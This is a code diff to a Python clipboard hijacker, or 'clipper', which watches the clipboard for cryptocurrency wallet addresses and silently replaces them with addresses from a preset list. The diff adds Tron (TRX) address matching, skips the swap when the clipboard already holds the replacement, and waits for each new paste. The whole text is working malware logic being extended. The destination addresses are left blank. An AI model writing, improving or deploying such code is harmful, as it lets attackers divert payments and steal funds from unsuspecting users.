@@ -11,7 +11,8 @@ addresses = {
     'LTC': '',
     'XMR': '',
     'BCH': '',
-    'DASH': ''
+    'DASH': '',
+    'TRX': ''
 }
 
 def startup():
@@ -34,12 +35,14 @@ def match():
     xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
     bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
     dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
+    trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
 
     for currency, address in addresses.items():
         if eval(f'{currency.lower()}_match'):
-            if address:
+            if address and address != clipboard:
                 pyperclip.copy(address)
             break
 
 while True:
+    pyperclip.waitForNewPaste()
     match()
